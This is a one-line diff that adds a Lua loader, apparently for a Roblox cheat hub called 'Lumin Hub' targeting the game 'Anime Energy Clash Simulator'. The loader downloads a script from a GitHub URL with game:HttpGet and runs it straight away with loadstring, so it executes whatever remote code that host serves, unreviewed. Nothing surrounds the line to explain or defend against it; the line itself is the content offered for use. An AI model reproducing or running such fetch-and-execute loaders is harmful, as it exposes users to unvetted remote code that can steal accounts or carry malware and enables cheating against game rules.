@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/No6No6No7yt/Lumin-Hub/main/%5BFREE%20LIMITED%5DAnime%20Energy%20Clash%20Simulator'))(); 
